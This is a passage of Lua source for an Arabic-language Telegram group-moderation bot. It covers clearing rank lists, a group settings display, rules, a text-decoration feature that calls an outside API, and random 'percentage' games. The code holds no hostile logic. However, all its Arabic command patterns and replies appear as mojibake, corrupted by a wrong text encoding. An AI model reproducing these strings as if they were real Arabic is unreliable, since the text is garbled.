if txts[2] == 'ุงูููุดุฆูู ุงูุงุณุงุณููู' or txtss[2] == 'ุงูููุดุฆูู ุงูุงุณุงุณููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูููุดุฆูู ุงูุงุณุงุณููู")  
Devmfm:del(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'ุงูููุดุฆูู' or txtss[2] == 'ุงูููุดุฆูู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูููุดุฆูู")  
Devmfm:del(mustafa..'mfm:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'ุงููุฏุฑุงุก' or txtss[2] == 'ุงููุฏุฑุงุก' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููุฏุฑุงุก")  
Devmfm:del(mustafa..'mfm:Managers:'..msg.chat_id_)
end 
if txts[2] == 'ุงูููุธููู' or txtss[2] == 'ุงูููุธููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูููุธููู")  
Devmfm:del(mustafa..'mfm:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'ุงูุงุฏูููู' or txtss[2] == 'ุงูุงุฏูููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูุงุฏูููู")  
Devmfm:del(mustafa..'mfm:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'ุงููุทุงูู' or txtss[2] == 'ุงููุทุงูู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููุทุงูู")  
Devmfm:del(mustafa..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'ุงูุฑุงุจุท' or txtss[2] == 'ุงูุฑุงุจุท' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุฑุงุจุท ุงููุฌููุนู")  
Devmfm:del(mustafa.."mfm:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'ุงููููุฒูู' or txtss[2] == 'ุงููููุฒูู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููููุฒูู")  
Devmfm:del(mustafa..'mfm:VipMem:'..msg.chat_id_)
end
if txts[2] == 'ุงูููุชูููู' or txtss[2] == 'ุงูููุชูููู' then
Devmfm:del(mustafa..'mfm:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูููุชูููู")  
end
if txts[2] == 'ุงููููุฏูู' or txtss[2] == 'ุงููููุฏูู' then     
local List = Devmfm:smembers(mustafa..'mfm:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููููุฏูู")  
end
if txts[2] == 'ูุงุฆูู ุงูููุน' or txtss[2] == 'ูุงุฆูู ุงูููุน' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูุงุฆูุฉ ุงูููุน")  
Devmfm:del(mustafa..'mfm:Filters:'..msg.chat_id_)
end
if txts[2] == 'ููุงุฆู ุงูููุน' or txtss[2] == 'ููุงุฆู ุงูููุน' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ููุงุฆู ุงูููุน")  
Devmfm:del(mustafa..'mfm:Filters:'..msg.chat_id_)
Devmfm:del(mustafa.."mfm:FilterAnimation"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:FilterPhoto"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'ูุงุฆูู ููุน ุงููุชุญุฑูุงุช' or txtss[2] == 'ูุงุฆูู ููุน ุงููุชุญุฑูุงุช' then     
Devmfm:del(mustafa.."mfm:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูุงุฆูุฉ ููุน ุงููุชุญุฑูุงุช")  
end
if txts[2] == 'ูุงุฆูู ููุน ุงูุตูุฑ' or txtss[2] == 'ูุงุฆูู ููุน ุงูุตูุฑ' then     
Devmfm:del(mustafa.."mfm:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูุงุฆูุฉ ููุน ุงูุตูุฑ")  
end
if txts[2] == 'ูุงุฆูู ููุน ุงูููุตูุงุช' or txtss[2] == 'ูุงุฆูู ููุน ุงูููุตูุงุช' then     
Devmfm:del(mustafa.."mfm:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูุงุฆูุฉ ููุน ุงูููุตูุงุช")  
end
end
end
if text and text:match("^ุญุฐู ุงูููุงุฆู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงูููุงุฆู$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธููููุดุฆ ุงูุงุณุงุณู ููุท', 1, 'md')
else
Devmfm:del(mustafa..'mfm:Ban:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Admins:'..msg.chat_id_) Devmfm:del(mustafa..'User:Donky:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:VipMem:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Filters:'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Muted:'..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู โซ โจ ูุงุฆูุฉ ุงูููุน โข ุงููุญุธูุฑูู โข ุงูููุชูููู โข ุงูุงุฏูููู โข ุงููููุฒูู โข ุงููุทุงูู โฉ ุจูุฌุงุญ \n โ", 1, 'md')
end end
if text and text:match("^ุญุฐู ุฌููุน ุงูุฑุชุจ$") and ChCheck(msg) or text and text:match("^ูุณุญ ุฌููุน ุงูุฑุชุจ$") and ChCheck(msg) or text and text:match("^ุชูุฒูู ุฌููุน ุงูุฑุชุจ$") and ChCheck(msg) then
if not mfmConstructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุดุฆ ุงููุฌููุนู ููุท', 1, 'md')
else
local basicconstructor = Devmfm:smembers(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
local constructor = Devmfm:smembers(mustafa..'mfm:Constructor:'..msg.chat_id_)
local Managers = Devmfm:smembers(mustafa..'mfm:Managers:'..msg.chat_id_)
local admins = Devmfm:smembers(mustafa..'mfm:Admins:'..msg.chat_id_)
local vipmem = Devmfm:smembers(mustafa..'mfm:VipMem:'..msg.chat_id_)
local donky = Devmfm:smembers(mustafa..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'ุงูููุดุฆูู ุงูุงุณุงุณููู โข ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'ุงูููุดุฆูู โข ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'ุงููุฏุฑุงุก โข ' else Managerst = '' end
if #admins ~= 0 then adminst = 'ุงูุงุฏูููู โข ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'ุงููููุฒูู โข ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'ุงููุทุงูู โข ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
Devmfm:del(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Constructor:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Managers:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:Admins:'..msg.chat_id_)
Devmfm:del(mustafa..'mfm:VipMem:'..msg.chat_id_)
Devmfm:del(mustafa..'User:Donky:'..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ุฌููุน ุงูุฑุชุจ ุงูุชุงููู โซ โจ "..basicconstructort..''..constructort..''..Managerst..''..adminst..''..vipmemt..''..donkyt.." โฉ ุจูุฌุงุญ \n โ", 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุงุชูุฌุฏ ุฑุชุจ ููุง", 1, 'md')
end 
end 
end
if Admin(msg) then 
if text and text:match("^ุงูุงุนุฏุงุฏุงุช$") and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_)
end
if Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "ุจุงูุทุฑุฏ"     
elseif Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "ุจุงูุชููุฏ"     
elseif Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "ุจุงููุชู"           
elseif Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "ุจุงูุญุฐู"
else     
flood = "ููุชูุญ"     
end
if Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "ุจุงูุญุฐู"
elseif Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "ุจุงูุชููุฏ"   
elseif Devmfm:get(mustafa.."mfm:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "ุจุงูุทุฑุฏ"    
else
lock_bots = "ููุชูุญู"    
end
if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then mute_text = 'ููููู' else mute_text = 'ููุชูุญู'end
if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then mute_photo = 'ููููู' else mute_photo = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then mute_video = 'ููููู' else mute_video = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'ููููู' else mute_gifs = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then mute_music = 'ููููู' else mute_music = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then mute_in = 'ููููู' else mute_in = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then mute_voice = 'ููููู' else mute_voice = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'ููููู' else mute_edit = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then mute_links = 'ููููู' else mute_links = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then lock_pin = 'ููููู' else lock_pin = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'ููููู' else lock_sticker = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'ููููู' else lock_tgservice = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'ููููู' else lock_wp = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'ููููู' else lock_htag = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then lock_tag = 'ููููู' else lock_tag = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then lock_location = 'ููููู' else lock_location = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then lock_contact = 'ููููู' else lock_contact = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then lock_english = 'ููููู' else lock_english = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'ููููู' else lock_arabic = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then lock_forward = 'ููููู' else lock_forward = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then lock_file = 'ููููู' else lock_file = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then markdown = 'ููููู' else markdown = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then lock_spam = 'ููููู' else lock_spam = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then lock_Join = 'ูููู' else lock_Join = 'ููุชูุญ' end
if Devmfm:get(mustafa.."mfm:Lock:Welcome"..msg.chat_id_) then send_welcome = 'ููููู' else send_welcome = 'ููุชูุญู' end
if Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'ููุชูุญ' else lock_fshar = 'ูููู' end
if Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'ููุชูุญ' else lock_kaf = 'ูููู' end
if Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then lock_taf = 'ููุชูุญู' else lock_taf = 'ููููู' end
if Devmfm:get(mustafa..'mfm:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'ููููู' else lock_farsi = 'ููุชูุญู' end
local Flood_Num = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
local TXTE = "โ๏ธุงุนุฏุงุฏุงุช ุงููุฌููุนู โซ โค\nโ โ โ โ โ โ โ โ โ\n"
.."โ๏ธุงูุฑูุงุจุท โซ "..mute_links.."\n"
.."โ๏ธุงููุนุฑู โซ "..lock_tag.."\n"
.."โ๏ธุงูุจูุชุงุช โซ "..lock_bots.."\n"
.."โ๏ธุงููุชุญุฑูู โซ "..mute_gifs.."\n"
.."โ๏ธุงูููุตูุงุช โซ "..lock_sticker.."\n"
.."โ๏ธุงููููุงุช โซ "..lock_file.."\n"
.."โ๏ธุงูุตูุฑ โซ "..mute_photo.."\n"
.."โ๏ธุงูููุฏูู โซ "..mute_video.."\n"
.."โ๏ธุงูุงูููุงูู โซ "..mute_in.."\n"
.."โ๏ธุงูุฏุฑุฏุดู โซ "..mute_text.."\n"
.."โ๏ธุงูุชูุฌูู โซ "..lock_forward.."\n"
.."โ๏ธุงูุงุบุงูู โซ "..mute_music.."\n"
.."โ๏ธุงูุตูุช โซ "..mute_voice.."\n"
.."โ๏ธุงูุฌูุงุช โซ "..lock_contact.."\n"
.."โ๏ธุงููุงุฑูุฏุงูู โซ "..markdown.."\n"
.."โ๏ธุงููุงุดุชุงู โซ "..lock_htag.."\n"
.."โ๏ธุงูุชุนุฏูู โซ "..mute_edit.."\n"
.."โ๏ธุงูุชุซุจูุช โซ "..lock_pin.."\n"
.."โ๏ธุงูุงุดุนุงุฑุงุช โซ "..lock_tgservice.."\n"
.."โ๏ธุงูููุงูุด โซ "..lock_spam.."\n"
.."โ๏ธุงูุฏุฎูู โซ "..lock_Join.."\n"
.."โ๏ธุงูุดุจูุงุช โซ "..lock_wp.."\n"
.."โ๏ธุงูููุงูุน โซ "..lock_location.."\n"
.."โ๏ธุงููุดุงุฑ โซ "..lock_fshar.."\n"
.."โ๏ธุงูููุฑ โซ "..lock_kaf.."\n"
.."โ๏ธุงูุทุงุฆููู โซ "..lock_taf.."\n"
.."โ๏ธุงูุนุฑุจูู โซ "..lock_arabic.."\n"
.."โ๏ธุงูุงููููุฒูู โซ "..lock_english.."\n"
.."โ๏ธุงููุงุฑุณูู โซ "..lock_farsi.."\n"
.."โ๏ธุงูุชูุฑุงุฑ โซ "..flood.."\n"
.."โ๏ธุนุฏุฏ ุงูุชูุฑุงุฑ โซ "..Flood_Num.."\n"
.."โ๏ธุนุฏุฏ ุงูุณุจุงู โซ "..spam_c.."\n"
.."โ โ โ โ โ โ โ โ โ\nโ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)\n"
Dev_mfm(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
if text and text:match("^ููู (.*)$") then
local txt = {string.match(text, "^(ููู) (.*)$")}
Dev_mfm(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if Devmfm:get(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ููุงููู ุงููุฌููุนู', 1, 'md')
Devmfm:del(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Devmfm:del(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:rules'..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ููุงููู ุงููุฌููุนู', 1, 'md')
return false   
end
if text and text:match("^ุถุน ููุงููู$") and ChCheck(msg) or text and text:match("^ูุถุน ููุงููู$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ูู ุงูููุงููู ุงูุงู', 1, 'md')
Devmfm:set(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^ุงูููุงููู$") then
local rules = Devmfm:get(mustafa..'mfm:rules'..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
if text == "ุชูุนูู ุงูุฒุฎุฑูู" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุฒุฎุฑูู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Zrf:mfm'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงูุฒุฎุฑูู" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุฒุฎุฑูู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Zrf:mfm'..msg.chat_id_,true)  
end
if Devmfm:get(mustafa..'Zrf:mfm'..msg.chat_id_..''..msg.sender_user_id_) then 
if text and text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ุงูุฒุฎุฑูู', 1, 'md')
Devmfm:del(mustafa..'Zrf:mfm'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "โ๏ธูุงุฆูุฉ ุงูุฒุฎุฑูู โซ โค\nโ โ โ โ โ โ โ โ โ\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'md')
Devmfm:del(mustafa..'Zrf:mfm'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if not Devmfm:get(mustafa..'mfm:Zrf:mfm'..msg.chat_id_) then
if text == 'ุฒุฎุฑูู' and ChCheck(msg) or text == 'ุงูุฒุฎุฑูู' and ChCheck(msg) then  
Devmfm:setex(mustafa.."Zrf:mfm"..msg.chat_id_..""..msg.sender_user_id_,300,true)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ูู ุงููููู ูุฒุฎุฑูุชูุง \nููููู ุงูุฒุฎุฑูุฉ ุจุงููุบู { en } ~ { ar } ', 1, 'md')
end
end
if not Devmfm:get(mustafa..'mfm:Zrf:mfm'..msg.chat_id_) then
if text and text:match("^ุฒุฎุฑูู (.*)$") and ChCheck(msg) or text and text:match("^ุฒุฎุฑู (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^ุฒุฎุฑูู (.*)$") or text:match("^ุฒุฎุฑู (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "โ๏ธูุงุฆูุฉ ุงูุฒุฎุฑูู โซ โค\nโ โ โ โ โ โ โ โ โ\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
if text == "ุชูุนูู ุงูุงุจุฑุงุฌ" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงุจุฑุงุฌ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Brg:mfm'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงูุงุจุฑุงุฌ" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงุจุฑุงุฌ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Brg:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Brg:mfm'..msg.chat_id_) then
if text and text:match("^ุจุฑุฌ (.*)$") and ChCheck(msg) or text and text:match("^ุจุฑุฌู (.*)$") and ChCheck(msg) then 
local TextBrg = text:match("^ุจุฑุฌ (.*)$") or text:match("^ุจุฑุฌู (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.mfm  
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
if text and (text == "ุชูุนูู ุงูุงูุฑ ุงููุณุจ" or text == "ุชูุนูู ูุณุจู ุงูุญุจ" or text == "ุชูุนูู ูุณุจู ุงููุฑู" or text == "ุชูุนูู ูุณุจู ุงูุฑุฌููู" or text == "ุชูุนูู ูุณุจู ุงูุงููุซู" or text == "ุชูุนูู ูุณุจู ุงูุบุจุงุก") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงูุฑ ุงููุณุจ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) 
end
if text and (text == "ุชุนุทูู ุงูุงูุฑ ุงููุณุจ" or text == "ุชุนุทูู ูุณุจู ุงูุญุจ" or text == "ุชุนุทูู ูุณุจู ุงููุฑู" or text == "ุชุนุทูู ูุณุจู ุงูุฑุฌููู" or text == "ุชุนุทูู ูุณุจู ุงูุงููุซู" or text == "ุชุนุทูู ูุณุจู ุงูุบุจุงุก") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงูุฑ ุงููุณุจ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Nsba:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text == "ูุณุจู ุงูุญุจ" and ChCheck(msg) or text == "ูุณุจุฉ ุงูุญุจ" and ChCheck(msg) then
Devmfm:set(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุจุงุฑุณู ุงุณููู ูุญุณุงุจ ูุณุจุฉ ุงูุญุจ ุจููููุง ููุซุงู โซ ุฌุงู ูุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุญุจ" and text ~= "ูุณุจุฉ ุงูุญุจ" and Devmfm:get(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุญุจ ', 1, 'md')
Devmfm:del(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุณุจุฉ ุงูุญุจ ุจูู '..text..' ูู : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text == "ูุณุจู ุงููุฑู" and ChCheck(msg) or text == "ูุณุจุฉ ุงููุฑู" and ChCheck(msg) then
Devmfm:set(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุจุงุฑุณู ุงุณููู ูุญุณุงุจ ูุณุจุฉ ุงููุฑู ุจููููุง ููุซุงู โซ ุฌุงู ูุฑูุฒ', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงููุฑู" and text ~= "ูุณุจุฉ ุงููุฑู" and Devmfm:get(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงููุฑู ', 1, 'md')
Devmfm:del(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุณุจุฉ ุงููุฑู ุจูู '..text..' ูู : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุฑุฌููู" or text == "ูุณุจุฉ ุงูุฑุฌููู" or text == "ูุณุจู ุฑุฌููู" or text == "ูุณุจุฉ ุฑุฌููู") and ChCheck(msg) then
Devmfm:set(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุจุงุฑุณู ุงุณู ุงูุดุฎุต ูููุงุณ ูุณุจุฉ ุฑุฌููุชู ููุซุงู โซ ุฌุงู', 1, 'md')
end
end
if text and text ~= "ูุณุจู ุงูุฑุฌููู" and text ~= "ูุณุจุฉ ุงูุฑุฌููู" and text ~= "ูุณุจู ุฑุฌููู" and text ~= "ูุณุจุฉ ุฑุฌููู" and Devmfm:get(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'ุงูุบุงุก' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุฑ ูุณุจุฉ ุงูุฑุฌููู ', 1, 'md')
Devmfm:del(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุณุจุฉ ุฑุฌููุฉ '..text..' ูู : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text and (text == "ูุณุจู ุงูุงููุซู" or text == "ูุณุจุฉ ุงูุงููุซู" or text == "ูุณุจู ุงููุซู" or text == "ูุณุจุฉ ุงููุซู") and ChCheck(msg) then
